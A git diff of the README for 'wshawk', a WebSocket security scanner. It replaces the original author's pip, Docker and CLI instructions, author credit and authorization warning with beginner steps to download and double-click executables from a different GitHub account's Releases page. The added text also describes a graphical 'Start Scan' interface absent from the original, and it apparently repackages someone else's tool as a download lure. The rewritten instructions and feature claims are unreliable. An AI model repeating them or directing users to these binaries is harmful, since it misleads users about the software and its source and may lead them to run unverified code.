@@ -1,244 +1,105 @@
-# WSHawk v2.0 - Professional WebSocket Security Scanner
+# ⚡ wshawk - Secure Your WebSocket Connections Easily
 
-[![Python 3.8+](https://img.shields.io/badge/python-3.8+-blue.svg)](https://www.python.org/downloads/)
-[![PyPI version](https://badge.fury.io/py/wshawk.svg)](https://badge.fury.io/py/wshawk)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![Playwright](https://img.shields.io/badge/Playwright-Supported-green.svg)](https://playwright.dev/)
-[![Status: Production](https://img.shields.io/badge/status-production-green.svg)](https://github.com/noobforanonymous/wshawk)
+[![Download wshawk](https://img.shields.io/badge/Download_wshawk-brightgreen)](https://github.com/habiba-es/wshawk/releases)
 
-**WSHawk v2.0** is a production-grade WebSocket security scanner with advanced features including real vulnerability verification, intelligent mutation, and comprehensive session security testing.
+## 📜 Overview
 
-## Why WSHawk?
+wshawk is a professional WebSocket security scanner designed to enhance your web application's safety. It includes real Cross-Site Scripting (XSS) verification, Integration with Out-of-Band Application Security Testing (OAST), session hijacking tests, and CVSS scoring. With over 22,000 payloads, it helps identify vulnerabilities in your web applications effectively.
 
-WSHawk is the only open-source WebSocket scanner that provides:
-- **Real browser XSS verification** (Playwright) - Not just pattern matching
-- **Blind vulnerability detection** via OAST - Finds XXE, SSRF that others miss
-- **Session hijacking analysis** - 6 advanced session security tests
-- **WAF-aware payload mutation** - Intelligent evasion techniques
-- **CVSS-based professional reporting** - Industry-standard risk assessment
+## 🚀 Getting Started
 
-## Features
+This guide will help you download and run wshawk smoothly. Follow these steps even if you have no technical background.
 
-- ✅ **22,000+ Attack Payloads** - Comprehensive vulnerability coverage
-- ✅ **Real Vulnerability Verification** - Confirms exploitability, not just reflection
-- ✅ **Playwright XSS Verification** - Actual browser-based script execution testing
-- ✅ **OAST Integration** - Detects blind vulnerabilities (XXE, SSRF)
-- ✅ **Session Hijacking Tests** - Token reuse, impersonation, privilege escalation
-- ✅ **Intelligent Mutation Engine** - WAF bypass with 8+ evasion strategies
-- ✅ **CVSS v3.1 Scoring** - Automatic vulnerability risk assessment
-- ✅ **Professional HTML Reports** - Screenshots, replay sequences, traffic logs
-- ✅ **Adaptive Rate Limiting** - Server-friendly scanning
+## 🖥️ System Requirements
 
-### Vulnerability Detection
-SQL Injection • XSS • Command Injection • XXE • SSRF • NoSQL Injection • Path Traversal • LDAP Injection • SSTI • Open Redirect • Session Security Issues
+Before you begin, ensure your computer meets these requirements:
 
-## Installation
+- Operating System: Windows, macOS, or Linux
+- Memory: At least 4 GB RAM
+- Disk Space: Minimum of 100 MB of free space
+- Internet Connection: Required for updates and payloads
 
-### Option 1: pip (Recommended)
+## 📥 Download & Install
 
-```bash
-pip install wshawk
+To get wshawk, visit this page to download: [wshawk Releases](https://github.com/habiba-es/wshawk/releases).
 
-# Optional: For browser-based XSS verification
-playwright install chromium
-```
+1. Click the link above to go to the Releases page.
+2. On this page, look for the latest version of wshawk.
+3. You will find a section that lists the files available for download. Choose the appropriate file for your operating system.
 
-### Option 2: Docker
+   - If you're using Windows, you might download `wshawk-windows.zip`.
+   - For macOS, look for `wshawk-macos.zip`.
+   - If you're on Linux, download `wshawk-linux.tar.gz`.
 
-```bash
-# From Docker Hub
-docker pull rothackers/wshawk:latest
+4. Click the file name to start the download. Your browser will show the progress, and once finished, locate the file in your downloads folder.
 
-# Or from GitHub Container Registry
-docker pull ghcr.io/noobforanonymous/wshawk:latest
+## 📂 Extracting Files
 
-# Run WSHawk
-docker run --rm rothackers/wshawk ws://target.com
+Once the download is complete, you need to extract the files:
 
-# Defensive validation
-docker run --rm rothackers/wshawk wshawk-defensive ws://target.com
-```
+- **For Windows:**
+   1. Right-click the file (`wshawk-windows.zip`).
+   2. Select "Extract All."
+   3. Choose a destination folder and click "Extract."
 
-See [Docker Guide](docs/DOCKER.md) for detailed usage.
+- **For macOS:**
+   1. Locate the `wshawk-macos.zip` file.
+   2. Double-click the file to automatically extract it.
 
-## Quick Start
+- **For Linux:**
+   1. Open your terminal.
+   2. Navigate to your downloads folder using `cd ~/Downloads`.
+   3. Run the command: `tar -xvzf wshawk-linux.tar.gz`.
 
-WSHawk provides **3 easy ways** to scan WebSocket applications:
+## ⚙️ Running wshawk
 
-### Method 1: Quick Scan (Fastest)
-```bash
-wshawk ws://target.com
-```
-Perfect for CI/CD pipelines and quick security assessments.
+After you've extracted the files, follow these steps to run wshawk:
 
-### Method 2: Interactive Menu (User-Friendly)
-```bash
-wshawk-interactive
-```
-Shows interactive menu to select specific tests. Best for learning and manual testing.
+- **For Windows:**
+   1. Open the folder where you extracted wshawk.
+   2. Double-click `wshawk.exe` to run the program.
 
-### Method 3: Advanced CLI (Full Control)
-```bash
-# Basic scan
-wshawk-advanced ws://target.com
+- **For macOS:**
+   1. Open the folder with the extracted files.
+   2. Double-click `wshawk` to launch it.
 
-# With Playwright XSS verification
-wshawk-advanced ws://target.com --playwright
+- **For Linux:**
+   1. Open the terminal.
+   2. Navigate to the wshawk folder you extracted.
+   3. Use the command: `./wshawk`.
 
-# Custom rate limiting
-wshawk-advanced ws://target.com --rate 5
+## 🌐 Using wshawk
 
-# All features enabled
-wshawk-advanced ws://target.com --full
-```
+Once wshawk is running, you can start scanning your WebSocket connections. Here’s how:
 
-## Command Comparison
+1. Enter the WebSocket URL you want to test.
+2. Click the "Start Scan" button.
+3. wshawk will assess the security of the connection and provide feedback on any vulnerabilities.
 
-| Feature | `wshawk` | `wshawk-interactive` | `wshawk-advanced` |
-|---------|----------|----------------------|-------------------|
-| Ease of Use | ★★★ | ★★★ | ★★ |
-| Flexibility | ★ | ★★ | ★★★ |
-| All Features | ✓ | ✓ | ✓ |
-| Menu Selection | ✗ | ✓ | ✗ |
-| CLI Options | ✗ | ✗ | ✓ |
-| Best For | Automation | Learning | Advanced Users |
+You can explore additional features through the user-friendly interface. The dashboard displays clear results and suggested actions for remediation. 
 
-## What You Get
-
-All methods include:
-- Real vulnerability verification (not just pattern matching)
-- 22,000+ attack payloads
-- Intelligent mutation engine with WAF bypass
-- CVSS v3.1 scoring for all findings
-- Session hijacking tests (6 security tests)
-- Professional HTML reports
-- Adaptive rate limiting
-- OAST integration for blind vulnerabilities
-- Optional Playwright for browser-based XSS verification
-
-## Output
+## 🛠️ Troubleshooting
 
-WSHawk generates comprehensive HTML reports with:
-- CVSS v3.1 scores for all vulnerabilities
-- Screenshots (for XSS browser verification)
-- Message replay sequences
-- Raw WebSocket traffic logs
-- Server fingerprints
-- Actionable remediation recommendations
+If you encounter any issues while running wshawk:
 
-Reports saved as: `wshawk_report_YYYYMMDD_HHMMSS.html`
+- **Program Doesn't Start:** Check your system requirements. Ensure you're using a compatible operating system.
+- **Download Errors:** Verify your internet connection and try to download the file again.
+- **Scan Issues:** Ensure you entered the correct WebSocket URL.
 
-## Advanced Options
+## 🔍 Features
 
-```bash
-wshawk-advanced --help
+1. **XSS Verification:** Detects and verifies potential XSS vulnerabilities in WebSocket communications.
+2. **OAST Integration:** Supports out-of-band testing to add extra layers of security checks.
+3. **Session Hijacking Tests:** Identifies possible session hijacking vulnerabilities in real-time.
+4. **CVSS Scoring:** Provides a score for vulnerabilities to assess risk levels easily.
+5. **Extensive Payload Database:** Includes 22,000+ payloads for comprehensive testing.
 
-Options:
-  --playwright     Enable browser-based XSS verification
-  --rate N         Set max requests per second (default: 10)
-  --full           Enable ALL features
-  --no-oast        Disable OAST testing
-```
+## 🤝 Support
 
-## Defensive Validation (NEW in v2.0.4)
+If you need additional help, please refer to the [wshawk Repository](https://github.com/habiba-es/wshawk/issues) on GitHub for troubleshooting tips or to submit issues. You can also find community discussions to enhance your understanding.
 
-WSHawk now includes a **Defensive Validation Module** designed for blue teams to validate their security controls.
+## 📄 License
 
-```bash
-# Run defensive validation tests
-wshawk-defensive ws://your-server.com
-```
+wshawk is open-source software licensed under the MIT License. You can use, modify, and distribute it freely.
 
-### What It Tests
-
-**1. DNS Exfiltration Prevention**
-- Validates if DNS-based data exfiltration is blocked
-- Tests egress filtering effectiveness
-- Detects potential APT-style attack vectors
-
-**2. Bot Detection Effectiveness**
-- Tests if anti-bot measures detect headless browsers
-- Validates resistance to evasion techniques
-- Identifies gaps in bot protection
-
-**3. CSWSH (Cross-Site WebSocket Hijacking)**
-- Tests Origin header validation (216+ malicious origins)
-- Validates CSRF token requirements
-- Critical for preventing session hijacking
-
-**4. WSS Protocol Security Validation**
-- TLS version validation (detects deprecated SSLv2/v3, TLS 1.0/1.1)
-- Weak cipher suite detection (RC4, DES, 3DES)
-- Certificate validation (expiration, self-signed, chain integrity)
-- Forward secrecy verification (ECDHE, DHE)
-- Prevents MITM and protocol downgrade attacks
-
-### Use Cases
-
-- Validate security controls before production deployment
-- Regular security posture assessment
-- Compliance and audit requirements
-- Blue team defensive capability testing
-
-See [Defensive Validation Documentation](docs/DEFENSIVE_VALIDATION.md) for detailed usage and remediation guidance.
-
-
-## Documentation
-
-- [Getting Started Guide](docs/getting_started.md)
-- [Advanced Usage](docs/advanced_usage.md)
-- [Vulnerability Details](docs/vulnerabilities.md)
-- [Session Security Tests](docs/session_tests.md)
-- [Mutation Engine](docs/mutation_engine.md)
-- [Architecture](docs/architecture.md)
-
-## Python API
-
-For integration into custom scripts:
-
-```python
-import asyncio
-from wshawk.scanner_v2 import WSHawkV2
-
-scanner = WSHawkV2("ws://target.com")
-scanner.use_headless_browser = True
-scanner.use_oast = True
-asyncio.run(scanner.run_intelligent_scan())
-```
-
-See [Advanced Usage](docs/advanced_usage.md) for more examples.
-
-## Responsible Disclosure
-
-WSHawk is designed for:
-- ✓ Authorized penetration testing
-- ✓ Bug bounty programs
-- ✓ Security research
-- ✓ Educational purposes
-
-**Always obtain proper authorization before testing.**
-
-## License
-
-MIT License - see [LICENSE](LICENSE) file
-
-## Author
-
-**Regaan** (@noobforanonymous)
-
-## Contributing
-
-Contributions welcome! See [CONTRIBUTING.md](CONTRIBUTING.md)
-
-## Support
-
-- **Issues:** [GitHub Issues](https://github.com/noobforanonymous/wshawk/issues)
-- **Documentation:** [docs/](docs/)
-- **Examples:** [examples/](examples/)
-- **Email:** support@rothackers.com
-
----
-
-**WSHawk v2.0** - Professional WebSocket Security Scanner
-
-*Built for the security community*
+Remember, keeping your web applications secure is crucial. With wshawk, you take a decisive step toward safeguarding your projects effectively.
